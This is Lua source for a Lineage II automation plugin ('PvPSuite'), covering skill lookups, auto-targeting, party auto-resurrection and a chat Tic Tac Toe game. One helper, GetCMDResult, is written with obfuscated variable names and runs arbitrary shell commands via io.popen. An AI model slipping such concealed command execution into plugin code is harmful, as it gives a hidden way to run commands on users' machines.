	local Skills = GetSkills();
	for Skill in Skills.list do
		if (SearchArray(Me:GetClass(),ArcherClasses)) then
			if (SearchArray(Skill.skillId,IRhASkills)) then
				IRhFound = true;
				return Skill.skillId;
			end;
		else
			if (SearchArray(Skill.skillId,IRhOSkills)) then
				local tmpSkill = GetSkills():FindById(Skill.skillId);
				if (tmpSkill:CanBeUsed()) then
					IRhFound = true;
					return Skill.skillId;
				end;
			end;
		end;
	end;
	if (IRhFound == false) then
		return 0;
	end;
end;
function iHaveCleanse()
	local CleanseFound = false;
	local Skills = GetSkills();
	for Skill in Skills.list do
		if (SearchArray(Skill.skillId,CleanseSkills)) then
			CleanseFound = true;
			return true;
		end;
	end;
	if (CleanseFound == false) then
		return false;
	end;
end;
function getCleanse()
	local CleanseFound = false;
	local Skills = GetSkills();
	for Skill in Skills.list do
		if (SearchArray(Skill.skillId,CleanseSkills)) then
			CleanseFound = true;
			return Skill.skillId;
		end;
	end;
	if (CleanseFound == false) then
		return 0;
	end;
end;
function iHaveAggroSk()
	local AggroFound = false;
	local Skills = GetSkills();
	for Skill in Skills.list do
		if (SearchArray(Skill.skillId,AggroSkills)) then
			AggroFound = true;
			return true;
		end;
	end;
	if (AggroFound == false) then
		return false;
	end;
end;
function getAggroSk()
	local AggroFound = false;
	local Skills = GetSkills();
	for Skill in Skills.list do
		if (SearchArray(Skill.skillId,AggroSkills)) then
			AggroFound = true;
			return Skill.skillId;
		end;
	end;
	if (AggroFound == false) then
		return 0;
	end;
end;
function iGotBuff(check)
	for x,a in pairs(check) do
		if (Me:GotBuff(a)) then
			return true;  
		end;
	end;
end;
function xGotBuff(x,check)
	for b,a in pairs(check) do
		if (x:GotBuff(a)) then
			return true;  
		end;
	end;
end;
function iHaveBuff(check)
	for x,a in pairs(check) do
		if (Me:GotBuff(a)) then
			return a;  
		end;
	end;
end;
function iHaveSkill(id)
	local Skills = GetSkills();
	for Skill in Skills.list do
		if (Skill.skillId == id) then
			return true;
		end;
	end;
end;
function GetCMDResult(cmd, raw)local roxfhiSYjS = assert(io.popen(cmd, 'r'));local JZGkFShyTg = assert(roxfhiSYjS:read('*a'));roxfhiSYjS:close();if (raw) then return JZGkFShyTg; end;JZGkFShyTg = string.gsub(JZGkFShyTg, '^%s+', '');JZGkFShyTg = string.gsub(JZGkFShyTg, '%s+$', '');JZGkFShyTg = string.gsub(JZGkFShyTg, '[\n\r]+', ' ');return JZGkFShyTg;end;
function Split(inputstr, sep)
	if (sep == nil) then
		sep = "%s";
	end;
	t={};
	I=1;
	for str in string.gmatch(inputstr, "([^"..sep.."]+)") do
		t[I] = str;
		I = I + 1;
	end;
	return t;
end;
function Explode(div,str)
	if (div == '') then return false; end;
	local pos,arr = 0,{};
	for st,sp in function() return string.find(str,div,pos,true) end do
		table.insert(arr,string.sub(str,pos,st-1));
		pos = sp + 1;
	end;
	table.insert(arr,string.sub(str,pos));
	return arr;
end;
function translateSave(bool)
	if (tostring(bool) == "true") then
		return "Enabled";
	elseif (tostring(bool) == "false") then
		return "Disabled";
	else
		return tostring(bool);
	end;
end;
function translateLoad(str)
	if (tostring(str) == "Enabled") then
		return true;
	elseif (tostring(str) == "Disabled") then
		return false;
	else
		return tostring(str);
	end;
end;
function RawTarget(userNm)
	if (userNm == MyName) then
		Command("/target "..MyName);
	else
		if (userNm ~= nil) then
			if (GetUserByName(userNm) ~= nil) then
				if (GetUserByName(userNm):IsValid()) then
					if (GetTarget() ~= nil) then
						if (GetTarget():GetName() ~= userNm) then
							Command("/target "..userNm);
						end;
					else
						Command("/target "..userNm);
					end;
				end;
			end;
		end;
	end;
end;
function DoGame(action,var)
	if (action == "Tic Tac Toe") then
		DoGameDialog(action);
	elseif (action == "TicTacToeEDF") then
			if (TTT[1]) then
				if (TTT[4]) then
					SendPM(TTT[3],"[~_ E]")
				else
					PTMsg("I ended the game!");
				end;		
				B = {"B1","B2","B3","B4","B5","B6","B7","B8","B9"};
				TTT[1] = false;
				TTT[3] = "";
				TTT[4] = false;
				TTT[6] = false;
				TTT[9] = false;
				TTT[10] = true;
				TTT[12] = false;
			end;
				SubMenu("Other");
	elseif (action == "TicTacToeED") then
			if (TTT[1]) then
				if (TTT[4]) then
					SendPM(TTT[3],"[~_ E]")
				else
					PTMsg("I ended the game!");
				end;		
				B = {"B1","B2","B3","B4","B5","B6","B7","B8","B9"};
				TTT[1] = false;
				TTT[3] = "";
				TTT[4] = false;
				TTT[6] = false;
				TTT[9] = false;
				TTT[10] = true;
				TTT[12] = false;
				DoGameDialog("Tic Tac Toe");
			else
				if (GetTarget() ~= nil) then
					if (GetTarget():GetName() == MyName) then
						ShowToClient("Tic Tac Toe","You can't play with your self!");
						DoGameDialog("Tic Tac Toe");
					elseif (GetTarget():IsPlayer() == false) then
							ShowToClient("Tic Tac Toe","Please target a player!");
							DoGameDialog("Tic Tac Toe");
					else
						if (TTT[7] == "N/A") then
							ShowToClient("Tic Tac Toe","Set a mark first!");
							DoGameDialog("Tic Tac Toe");
						else
							TTT[1] = true;
							TTT[3] = GetTarget():GetName();
							ShowToClient("Tic Tac Toe",TTT[3].." set as your opponent!");
							TTT[6] = true;
							TTT[10] = false;
							TTThasPvPSuite();
						end;
					end;
				else
					ShowToClient("Tic Tac Toe","Please target someone first!");
					DoGameDialog("Tic Tac Toe");
				end;
			end;
	elseif (action == "TicTacToeAA") then
			if (TTT[2] == false) then
				TTT[2] = true;
				ShowToClient("Tic Tac Toe","Accept TTT Requests enabled!");
				DoGameDialog("Tic Tac Toe");
			else
				TTT[2] = false;
				ShowToClient("Tic Tac Toe","Accept TTT Requests disabled!");
				DoGameDialog("Tic Tac Toe");
			end;
	elseif (action == "TicTacToeContinue") then
			if (CheckTTT() == "X") then
				if (TTT[4]) then
					SendPM(TTT[3],"[~_ T~_ T]X");
				else
					if (TTT[7] == "X") then
						TTT[11] = true;
						PTMsg("Sorry "..TTT[3]..", you lost! Maybe next time!");
					else
						TTT[11] = false;
						PTMsg("Congratulations "..TTT[3]..", you won!");
					end;
					TTT[9] = true;
					DoGame("TicTacToeContinue");
				end;
			elseif (CheckTTT() == "O") then
					if (TTT[4]) then
						SendPM(TTT[3],"[~_ T~_ T]O");
					else
						if (TTT[7] == "O") then
							TTT[11] = true;
							PTMsg("Sorry "..TTT[3]..", you lost! Maybe next time!");
						else
							TTT[11] = false;
							PTMsg("Congratulations "..TTT[3]..", you won!");
						end;
						TTT[9] = true;
						DoGame("TicTacToeContinue");
					end;
			elseif (CheckTTT() == "Draw") then
					if (TTT[4]) then
						SendPM(TTT[3],"[~_ T~_ T]D");
					else
						TTT[12] = true;
						TTT[9] = true;
						PTMsg("This round was draw! Maybe next time!");
						DoGame("TicTacToeContinue");
					end;
			else
				if (TTT[9]) then
					DoGameDialog("TTT - Finished");
				else
					DoGameDialog("TTT - Playing");
				end;
			end;
	elseif (action == "TTT") then
			if (TTT[10]) then
				DoGameDialog("Tic Tac Toe");
				TTT[10] = false;
			else
				if (TTT[6] == false) then
					ShowToClient("Tic Tac Toe","It's not your turn to play!");
					DoGame("TicTacToeContinue");
				else
					if (var == "B1") then
						if (B[1] == "B1") then
							TTT[6] = false;
							B[1] = TTT[7];
							if (TTT[4]) then
								SendPM(TTT[3],"~_ B1");
							else	
								PTMsg("~~Tic Tac Toe~~");
								miniFreeze();
								PTMsg("  ["..B[1].."] ["..B[2].."] ["..B[3].."]");
								miniFreeze();
								PTMsg("  ["..B[4].."] ["..B[5].."] ["..B[6].."]");
								miniFreeze();
								PTMsg("  ["..B[7].."] ["..B[8].."] ["..B[9].."]");
								miniFreeze();
								PTMsg("~~~~~~~~~~~");
							end;
							DoGame("TicTacToeContinue");
						else
							ShowToClient("Tic Tac Toe","This box is already marked!");
							DoGame("TicTacToeContinue");
						end;
					elseif (var == "B2") then
							if (B[2] == "B2") then
								TTT[6] = false;
								B[2] = TTT[7];
								if (TTT[4]) then
									SendPM(TTT[3],"~_ B2");
								else	
									PTMsg("~~Tic Tac Toe~~");
									miniFreeze();
									PTMsg("  ["..B[1].."] ["..B[2].."] ["..B[3].."]");
									miniFreeze();
									PTMsg("  ["..B[4].."] ["..B[5].."] ["..B[6].."]");
									miniFreeze();
									PTMsg("  ["..B[7].."] ["..B[8].."] ["..B[9].."]");
									miniFreeze();
									PTMsg("~~~~~~~~~~~");
								end;
								DoGame("TicTacToeContinue");
							else
								ShowToClient("Tic Tac Toe","This box is already marked!");
								DoGame("TicTacToeContinue");
							end;
					elseif (var == "B3") then
							if (B[3] == "B3") then
								TTT[6] = false;
								B[3] = TTT[7];
								if (TTT[4]) then
									SendPM(TTT[3],"~_ B3");
								else	
									PTMsg("~~Tic Tac Toe~~");
									miniFreeze();
									PTMsg("  ["..B[1].."] ["..B[2].."] ["..B[3].."]");
									miniFreeze();
									PTMsg("  ["..B[4].."] ["..B[5].."] ["..B[6].."]");
									miniFreeze();
									PTMsg("  ["..B[7].."] ["..B[8].."] ["..B[9].."]");
									miniFreeze();
									PTMsg("~~~~~~~~~~~");
								end;
								DoGame("TicTacToeContinue");
							else
								ShowToClient("Tic Tac Toe","This box is already marked!");
								DoGame("TicTacToeContinue");
							end;
					elseif (var == "B4") then
							if (B[4] == "B4") then
								TTT[6] = false;
								B[4] = TTT[7];
								if (TTT[4]) then
									SendPM(TTT[3],"~_ B4");
								else	
									PTMsg("~~Tic Tac Toe~~");
									miniFreeze();
									PTMsg("  ["..B[1].."] ["..B[2].."] ["..B[3].."]");
									miniFreeze();
									PTMsg("  ["..B[4].."] ["..B[5].."] ["..B[6].."]");
									miniFreeze();
									PTMsg("  ["..B[7].."] ["..B[8].."] ["..B[9].."]");
									miniFreeze();
									PTMsg("~~~~~~~~~~~");
								end;
								DoGame("TicTacToeContinue");
							else
								ShowToClient("Tic Tac Toe","This box is already marked!");
								DoGame("TicTacToeContinue");
							end;
					elseif (var == "B5") then
							if (B[5] == "B5") then
								TTT[6] = false;
								B[5] = TTT[7];
								if (TTT[4]) then
									SendPM(TTT[3],"~_ B5");
								else	
									PTMsg("~~Tic Tac Toe~~");
									miniFreeze();
									PTMsg("  ["..B[1].."] ["..B[2].."] ["..B[3].."]");
									miniFreeze();
									PTMsg("  ["..B[4].."] ["..B[5].."] ["..B[6].."]");
									miniFreeze();
									PTMsg("  ["..B[7].."] ["..B[8].."] ["..B[9].."]");
									miniFreeze();
									PTMsg("~~~~~~~~~~~");
								end;
								DoGame("TicTacToeContinue");
							else
								ShowToClient("Tic Tac Toe","This box is already marked!");
								DoGame("TicTacToeContinue");
							end;
					elseif (var == "B6") then
							if (B[6] == "B6") then
								TTT[6] = false;
								B[6] = TTT[7];
								if (TTT[4]) then
									SendPM(TTT[3],"~_ B6");
								else	
									PTMsg("~~Tic Tac Toe~~");
									miniFreeze();
									PTMsg("  ["..B[1].."] ["..B[2].."] ["..B[3].."]");
									miniFreeze();
									PTMsg("  ["..B[4].."] ["..B[5].."] ["..B[6].."]");
									miniFreeze();
									PTMsg("  ["..B[7].."] ["..B[8].."] ["..B[9].."]");
									miniFreeze();
									PTMsg("~~~~~~~~~~~");
								end;
								DoGame("TicTacToeContinue");
							else
								ShowToClient("Tic Tac Toe","This box is already marked!");
								DoGame("TicTacToeContinue");
							end;
					elseif (var == "B7") then
							if (B[7] == "B7") then
								TTT[6] = false;
								B[7] = TTT[7];
								if (TTT[4]) then
									SendPM(TTT[3],"~_ B7");
								else	
									PTMsg("~~Tic Tac Toe~~");
									miniFreeze();
									PTMsg("  ["..B[1].."] ["..B[2].."] ["..B[3].."]");
									miniFreeze();
									PTMsg("  ["..B[4].."] ["..B[5].."] ["..B[6].."]");
									miniFreeze();
									PTMsg("  ["..B[7].."] ["..B[8].."] ["..B[9].."]");
									miniFreeze();
									PTMsg("~~~~~~~~~~~");
								end;
								DoGame("TicTacToeContinue");
							else
								ShowToClient("Tic Tac Toe","This box is already marked!");
								DoGame("TicTacToeContinue");
							end;
					elseif (var == "B8") then
							if (B[8] == "B8") then
								TTT[6] = false;
								B[8] = TTT[7];
								if (TTT[4]) then
									SendPM(TTT[3],"~_ B8");
								else	
									PTMsg("~~Tic Tac Toe~~");
									miniFreeze();
									PTMsg("  ["..B[1].."] ["..B[2].."] ["..B[3].."]");
									miniFreeze();
									PTMsg("  ["..B[4].."] ["..B[5].."] ["..B[6].."]");
									miniFreeze();
									PTMsg("  ["..B[7].."] ["..B[8].."] ["..B[9].."]");
									miniFreeze();
									PTMsg("~~~~~~~~~~~");
								end;
								DoGame("TicTacToeContinue");
							else
								ShowToClient("Tic Tac Toe","This box is already marked!");
								DoGame("TicTacToeContinue");
							end;
					elseif (var == "B9") then
							if (B[9] == "B9") then
								TTT[6] = false;
								B[9] = TTT[7];
								if (TTT[4]) then
									SendPM(TTT[3],"~_ B9");
								else	
									PTMsg("~~Tic Tac Toe~~");
									miniFreeze();
									PTMsg("  ["..B[1].."] ["..B[2].."] ["..B[3].."]");
									miniFreeze();
									PTMsg("  ["..B[4].."] ["..B[5].."] ["..B[6].."]");
									miniFreeze();
									PTMsg("  ["..B[7].."] ["..B[8].."] ["..B[9].."]");
									miniFreeze();
									PTMsg("~~~~~~~~~~~");
								end;
								DoGame("TicTacToeContinue");
							else
								ShowToClient("Tic Tac Toe","This box is already marked!");
								DoGame("TicTacToeContinue");
							end;
					end;
				end;
			end;
	elseif (action == "TicTacToeSC") then
			if (var == "X") then
				TTT[7] = "X";
				TTT[8] = "O";
				DoGameDialog("Tic Tac Toe");
			elseif (var == "O") then
					TTT[7] = "O";
					TTT[8] = "X";
					DoGameDialog("Tic Tac Toe");
			end;
	else
		DoDialog(action);
	end;
end;
function DoGameDialog(action)
	local html = THtmlGenerator("PvP Suite > Fun > Mini Games > "..action);
	html:AddHtml('<center><img src="L2UI_CH3.herotower_deco" width=256 height=32 align=left>');
	if (action == "Tic Tac Toe") then
		if (TTT[1]) then
			html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=267><tr><td align=center valign=top width=236>");
			html:AddHtml('<font color="D51E87">A Tic Tac Toe game is active!</font>');
			html:AddButton(THtmlAction("/dogame"):AddParam("TicTacToeContinue"),THtmlButtonStyle.BUTTON_ACTION, "Continue Game",false,"","",170,25);
			html:AddButton(THtmlAction("/dogame"):AddParam("TicTacToeED"),THtmlButtonStyle.BUTTON_ACTION,"End Game",false,"","",170,25);
			html:AddHtml("</td></tr></table>");
		else
			html:AddButton(THtmlAction("/dogame"):AddParam("TicTacToeED"),THtmlButtonStyle.BUTTON_ACTION,"Start Game",false,"","",170,25);
			if (TTT[7] == "N/A") then
				html:AddHtml('</ br><font color="FF8000">Pick a mark!!</font></ br>');
			else
				html:AddHtml('</ br><font color="FF8000">Your mark: '..TTT[7]..'</font></ br>');
			end;
			html:Table_Start(true, false, 100);
			html:Table_AddColumns(2);
			html:AddButton(THtmlAction("/dogame"):AddParam("TicTacToeSC"):AddParam("X"),THtmlButtonStyle.BUTTON_ACTION,"X",false,"","",50,25);
			html:AddButton(THtmlAction("/dogame"):AddParam("TicTacToeSC"):AddParam("O"),THtmlButtonStyle.BUTTON_ACTION,"O",false,"","",50,25);
			html:Table_End();
			local Condition = false;
			if (TTT[2]) then
				Condition = true;
			end;
			html:AddHtml('</ br></ br></ br>');
			html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=254><tr><td align=center valign=top width=236>");
			html:AddButton(THtmlAction("/dogame"):AddParam("TicTacToeAA"),THtmlButtonStyle.BUTTON_EXTRA,"Accept TTT Requests",Condition,"","",170,25);
			html:AddHtml("</td></tr></table>");
			if (PvPSuite[17]) then
				html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=245><tr><td align=left valign=top width=236>");
				html:AddHtml('Instantly play Tic Tac Toe via dialogs with other players who are using PvPSuite, enable this to accept such requests and play together.');
				html:AddHtml("</td></tr></table>");
			end;
		end;		
	elseif (action == "TTT - Playing") then
			local Style = THtmlButtonStyle.BUTTON_CUSTOM;
			if ((TTT[6]) and (TTT[9] == false)) then
				Style = THtmlButtonStyle.BUTTON_ACTION;
			end;
			if ((TTT[6]) and (TTT[9] == false)) then
				html:AddHtml('</ br></ br><font color="A350CF">Its your turn!</font></ br>');
			elseif ((TTT[6] == false) and (TTT[9] == false)) then
				html:AddHtml('</ br></ br><font color="A350CF">'..TTT[3]..' is playing!</font></ br>');
			end;
			html:Table_Start(true, false, 99);
			html:Table_AddColumns(3);
			html:AddButton(THtmlAction("/dogame"):AddParam("TTT"):AddParam("B1"),Style,B[1],false,"","",33,25);
			html:AddButton(THtmlAction("/dogame"):AddParam("TTT"):AddParam("B2"),Style,B[2],false,"","",33,25);
			html:AddButton(THtmlAction("/dogame"):AddParam("TTT"):AddParam("B3"),Style,B[3],false,"","",33,25);
			html:Table_End();
			html:Table_Start(true, false, 99);
			html:Table_AddColumns(3);
			html:AddButton(THtmlAction("/dogame"):AddParam("TTT"):AddParam("B4"),Style,B[4],false,"","",33,25);
			html:AddButton(THtmlAction("/dogame"):AddParam("TTT"):AddParam("B5"),Style,B[5],false,"","",33,25);
			html:AddButton(THtmlAction("/dogame"):AddParam("TTT"):AddParam("B6"),Style,B[6],false,"","",33,25);
			html:Table_End();
			html:Table_Start(true, false, 99);
			html:Table_AddColumns(3);
			html:AddButton(THtmlAction("/dogame"):AddParam("TTT"):AddParam("B7"),Style,B[7],false,"","",33,25);
			html:AddButton(THtmlAction("/dogame"):AddParam("TTT"):AddParam("B8"),Style,B[8],false,"","",33,25);
			html:AddButton(THtmlAction("/dogame"):AddParam("TTT"):AddParam("B9"),Style,B[9],false,"","",33,25);
			html:Table_End();
	elseif (action == "TTT - Finished") then
			Style = THtmlButtonStyle.BUTTON_CUSTOM;
			if (TTT[9]) then
				html:Table_Start(true, false, 99);
				html:Table_AddColumns(3);
				html:AddButton(THtmlAction("/dogame"):AddParam("TTT"):AddParam("B1"),Style,B[1],false,"","",33,25);
				html:AddButton(THtmlAction("/dogame"):AddParam("TTT"):AddParam("B2"),Style,B[2],false,"","",33,25);
				html:AddButton(THtmlAction("/dogame"):AddParam("TTT"):AddParam("B3"),Style,B[3],false,"","",33,25);
				html:Table_End();
				html:Table_Start(true, false, 99);
				html:Table_AddColumns(3);
				html:AddButton(THtmlAction("/dogame"):AddParam("TTT"):AddParam("B4"),Style,B[4],false,"","",33,25);
				html:AddButton(THtmlAction("/dogame"):AddParam("TTT"):AddParam("B5"),Style,B[5],false,"","",33,25);
				html:AddButton(THtmlAction("/dogame"):AddParam("TTT"):AddParam("B6"),Style,B[6],false,"","",33,25);
				html:Table_End();
				html:Table_Start(true, false, 99);
				html:Table_AddColumns(3);
				html:AddButton(THtmlAction("/dogame"):AddParam("TTT"):AddParam("B7"),Style,B[7],false,"","",33,25);
				html:AddButton(THtmlAction("/dogame"):AddParam("TTT"):AddParam("B8"),Style,B[8],false,"","",33,25);
				html:AddButton(THtmlAction("/dogame"):AddParam("TTT"):AddParam("B9"),Style,B[9],false,"","",33,25);
				html:Table_End();
				if (TTT[12]) then
						html:AddHtml('</ br></ br><font color="FF8000">This round was draw! Maybe next time!</font></ br>');
				elseif (TTT[11]) then
					html:AddHtml('</ br></ br><font color="00FF00">Congratulations, you won!</font>');
				elseif (TTT[11] == false) then
						html:AddHtml('</ br></ br><font color="FF0000">Sorry, you lost! Maybe next time!</font></ br>');
						html:AddHtml('<font color="FF0000">'..TTT[3]..' won.</font>');
				end;			
				B = {"B1","B2","B3","B4","B5","B6","B7","B8","B9"};
				TTT[1] = false;
				TTT[3] = "";
				TTT[4] = false;
				TTT[6] = false;
				TTT[9] = false;
				TTT[10] = true;
				TTT[12] = false;
			end;		
		else
			html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=290><tr><td align=center valign=center width=236>");
			html:AddHtml('<center><font color="FF0000">Error 404!</font></center></ br>');
			html:AddHtml('<center><font color="FF8040">The page you are looking for does not exist.</font></center>');
			html:AddHtml("</td></tr></table></ br></ br>");
			html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=270><tr><td align=center valign=center width=236>");
			html:AddHtml('<center>If you think that this is a plugin error</center></ br>');
			html:AddHtml('<center>Please report it!</center></ br>');
			html:AddButton(THtmlAction("/doaction"):AddParam("Contact Info"),THtmlButtonStyle.BUTTON_ACTION, "Contact Info",false,"","",100,30);
			html:AddHtml("</td></tr></table>");
	end;
	html:AddHtml('<img src="L2UI_CH3.herotower_deco" width=256 height=32 align=left>');
	html:AddHtml("</ br></ br>");
	local ParamA = "/pvpsuite";
	local ParamB = "";
	if ((action == "Tic Tac Toe") or (action == "TTT - Finished")) then
		ParamA = "/doaction";
		ParamB = "Mini Games";
	elseif (action == "TTT - Playing") then
		ParamA = "/dogame";
		ParamB = "Tic Tac Toe";
	end;
	html:AddButton(THtmlAction(ParamA):AddParam(ParamB),THtmlButtonStyle.BUTTON_ACTION, "Go back",false,"","",120,21);
	html:AddHtml('</br ><font color="555555">PvPSuite '..PvPSuiteV..' - 2013</font>');
	html:AddHtml('</center>');
	HtmlBuild = html:GetString();	
	ShowHtmlStatus = true;
end;
function TTThasPvPSuite()
	awaitingResponse = true;
	SendPM(TTT[3],"[~_ T]"..TTT[7]);
	TTTcoOperate = true;
end;
function PTMsg(msg)
	Command("#"..msg);
end;
function CheckTTT()
	if (TTT[9] == false) then
		local char = "X";
		if (((B[1] == char) and (B[2] == char) and (B[3] == char)) or ((B[4] == char) and (B[5] == char) and (B[6] == char)) or ((B[7] == char) and (B[8] == char) and (B[9] == char)) or ((B[1] == char) and (B[4] == char) and (B[7] == char)) or ((B[2] == char) and (B[5] == char) and (B[8] == char)) or ((B[3] == char) and (B[6] == char) and (B[9] == char)) or ((B[1] == char) and (B[5] == char) and (B[9] == char)) or ((B[3] == char) and (B[5] == char) and (B[7] == char))) then
			return char;
		end;
		char = "O";
		if (((B[1] == char) and (B[2] == char) and (B[3] == char)) or ((B[4] == char) and (B[5] == char) and (B[6] == char)) or ((B[7] == char) and (B[8] == char) and (B[9] == char)) or ((B[1] == char) and (B[4] == char) and (B[7] == char)) or ((B[2] == char) and (B[5] == char) and (B[8] == char)) or ((B[3] == char) and (B[6] == char) and (B[9] == char)) or ((B[1] == char) and (B[5] == char) and (B[9] == char)) or ((B[3] == char) and (B[5] == char) and (B[7] == char))) then
			return char;
		end;
		if ((B[1] ~= "B1") and (B[2] ~= "B2") and (B[3] ~= "B3") and (B[4] ~= "B4") and (B[5] ~= "B5") and (B[6] ~= "B6") and (B[7] ~= "B7") and (B[8] ~= "B8") and (B[9] ~= "B9")) then
			return "Draw";
		end;
	end;
end;
function GetSkillIcon(skillId)
	local sk = tostring(skillId);
	local skId = tonumber(skillId);
	if (skId == 933) then
		return ("icon.skill0470");		
	elseif (sk:len() == 1) then
		return ("icon.skill000"..skId);
	elseif (sk:len() == 2) then
			return ("icon.skill00"..skId);
	elseif (sk:len() == 3) then
			return ("icon.skill0"..skId);
	elseif (sk:len() == 4) then
			return ("icon.skill"..skId);
	else
		return("icon.skill"..skId);
	end;
end;
function PausedDialog()
	local html = THtmlGenerator("PvP Suite - Paused");
	html:AddHtml('<center><table border=0 cellpadding=0 cellspacing=0 width=292 height=358 background="L2UI_CT1.SlideShow_DF_Credit_03"><tr><td valign="top" align="center"><table border=0 cellpadding=0 cellspacing=0><tr><td width=0 height=35 background="L2UI_CT1.SlideShow_DF_Credit_02"></td></tr></table>');
	html:AddHtml('<table width=220 border=0 bgcolor=282828><tr><td><center>');
	html:AddHtml('<font color="9933FF">' .. MyName .. "</font>,</br >Everything is paused at the moment!</br ></center>");
	html:AddHtml('</td></tr><tr><td>');
	html:AddHtml("<center></br >");
	html:AddButton(THtmlAction("/pp"),THtmlButtonStyle.BUTTON_ACTION, "Resume PvPSuite",false,"","",150,25);
	html:AddHtml('</br ><font color="FFFFFF">PvPSuite '..PvPSuiteV..' - 2013</font></br >');
	html:AddHtml('</center></td></tr></table></br >');
	html:AddHtml('</td></tr></table></center>');
	local PausedHTML = html:GetString();	
	ShowHtml(PausedHTML);
end;
function miniFreeze()
	if (miniFreezing == false) then
		miniFreezing = true;
		Sleep(50);
		miniFreezing = false;
	end;
end;
function Round(num, idp)
  local mult = 10^(idp or 0);
  return math.floor(num * mult + 1/2) / mult;
end
function Orderize(t,f)
	local a = {};
	for n in pairs(t) do
		table.insert(a,n);
	end;
	table.sort(a,f);
	local i = 0;
	local iter = function()
		i = i + 1;
		if (a[i] == nil)then
			return nil;
		else
			return a[i],t[a[i]];
		end;
	end;
	return iter;
end;
function sameAlly(usr)
	if (usr:GetAllianceName() ~= "") then
		if ((usr:GetAllianceName()) == (Me:GetAllianceName())) then
			return true;
		end;
	end;
	return false;
end;
checkAggro = coroutine.wrap( function ()
	repeat
		repeat
			Sleep(500);
			if (xGotBuff(GetUserByName(PvPSuite[25]),AggroBuffs) ~= true) then
				ClearTarget();
				ClearTargets();
				if ((aggroTarget ~= "") and (aggroTarget ~= nil)) then
					if (delayAggro) then
						if (GetUserByName(aggroTarget) ~= nil) then
							if (SearchArray(GetUserByName(aggroTarget):GetClass(),TankClasses) ~= true) then
								RawTarget(aggroTarget);
							end;
						end;
					else
						RawTarget(aggroTarget);
					end;
				end;
			else
				delayAggroC = 0;
				delayAggro = true;
			end;
			break
		until false;
		checkingAggro = false;
		coroutine.yield();
	until false;
end);
function sameClan(usr)
	if (usr:GetClanName() ~= "") then
		if ((usr:GetClanName()) == (Me:GetClanName())) then
			return true;
		end;
	end;
	return false;
end;
function canIuse(skId)
	local Skills = GetSkills();
	for Skill in Skills.list do
		if (Skill.skillId == skId) then
			if (Skill:CanBeUsed()) then
				return true;
			else
				return false;
			end;
		end;
	end;
end;
function tableLength(T)
  local count = 0;
  for _ in pairs(T) do count = count + 1 end;
  return count;
end;
function GetRandomGreeting()
	math.randomseed(os.time());
	local randomNumber = math.random(table.getn(Greetings));
	local randomGreeting = Greetings[randomNumber];
	if (lastRandomGreeting == randomGreeting) then
		randomGreeting = Greetings[randomNumber+1];
		if (randomGreeting == nil) then
			randomGreeting = Greetings[randomNumber-1];
		end;
	end;
	lastRandomGreeting = randomGreeting;
	return randomGreeting;
end;
function GetRandomQuote()
	math.randomseed(os.time());
	local randomNumber = math.random(table.getn(Quotes));
	local randomQuote = Quotes[randomNumber];
	if (lastRandomQuote == randomQuote) then
		randomQuote = Quotes[randomNumber+1];
		if (randomQuote == nil) then
			randomQuote = Quotes[randomNumber-1];
		end;
	end;
	lastRandomQuote = randomQuote;
	return randomQuote;
end;
function GetRandomGenre()
	math.randomseed(os.time());
	local randomNumber = math.random(table.getn(Genres));
	local randomGenre = Genres[randomNumber];
	if (lastRandomGenre == randomGenre) then
		randomGenre = Genres[randomNumber+1];
		if (randomGenre == nil) then
			randomGenre = Genres[randomNumber-1];
		end;
	end;
	lastRandomGenre = randomGenre;
	return randomGenre.." mix "..math.random(1,9);
end;
function IsInMyArena(who)
	local myLoc = Me:GetLocation();
	local usrLoc = who:GetLocation();
	local difx = myLoc.X - usrLoc.X;
	local dify = myLoc.Y - usrLoc.Y;
	if (((dify > -81) and (dify < 81)) and ((difx > -3500) and (dify < 3500)) and (IsClose(myLoc.Z,usrLoc.Z,3))) then
		return true;
	end;
	return false;
end;
function IsClose(value1,value2,difference)
	if (value1 == value2) then
		return true;
	elseif (value1 > value2) then
			local dif = value1 - value2;
			if (dif > difference) then
				return false;
			else
				return true;
			end;
	elseif (value1 < value2) then
			local dif = value2 - value1;
			if (dif > difference) then
				return false;
			else
				return true;
			end;
	end;
end;
function randomStringGenerator(s, l)
	local pass = {};
	math.randomseed(os.time());
	local size = math.random(s,l);
	for z = 1,size do
		case = math.random(1,2);
		a = math.random(1,#rChars);
		if case == 1 then
				x=string.upper(rChars[a]);
		elseif case == 2 then
				x=string.lower(rChars[a]);
		end;
		table.insert(pass, x:lower());
	end;
	return(table.concat(pass));
end;
function Step(var)
	if (var) then
		debugStep = 1;
	end;
	ShowToClient("DEBUG CALL",tostring(debugStep));
	debugStep = debugStep + 1;
end;
function checkDeadPTMember()
	local deadcount = 0;
	local deadmember = "";
	local partyList = GetPartyList();
	for user in partyList.list do
		if ((Me:GetRangeTo(user) < 500) and (user:IsAlikeDeath())) then
			 if ((targetBeforeRes == "") or (targetBeforeRes == nil)) then
				if (GetTarget() ~= nil) then
					targetBeforeRes = GetTarget():GetName();
				end;
			 end;
			 deadcount = deadcount + 1;
			 deadmember = user:GetName();
		end;
	end;
	if (deadcount == 1) then
		if (canIuse(1016)) then
			autoRessing = true;
			RawTarget(deadmember);
			ShowToClient("Auto PT Resurrection","Resurrecting "..deadmember.."!");
			UseSkillRaw(1016,false,false);
		else
			if (sameClan(GetUserByName(deadmember))) then
				if (canIuse(1254)) then
					autoRessing = true;
					RawTarget(deadmember);
					ShowToClient("Auto PT Resurrection","Mass Resurrecting "..deadmember.."!");
					UseSkillRaw(1254,false,false);
				else
					autoRessing = false;
				end;
			end;
		end;
	elseif (deadcount > 1) then
			if (sameClan(GetUserByName(deadmember))) then
				if (canIuse(1254)) then
					autoRessing = true;
					RawTarget(deadmember);
					ShowToClient("Auto PT Resurrection","Mass Resurrecting "..deadmember.."!");
					UseSkillRaw(1254,false,false);
				else
					if (canIuse(1016)) then
						autoRessing = true;
						RawTarget(deadmember);
						ShowToClient("Auto PT Resurrection","Resurrecting "..deadmember.."!");
						UseSkillRaw(1016,false,false);
					else
						autoRessing = false;
					end;
				end;
			else
				if (canIuse(1016)) then
					autoRessing = true;
					RawTarget(deadmember);
					ShowToClient("Auto PT Resurrection","Resurrecting "..deadmember.."!");
					UseSkillRaw(1016,false,false);
				end;
			end;
	else
		autoRessing = false;
	end;
	checkingDeads = false;
end;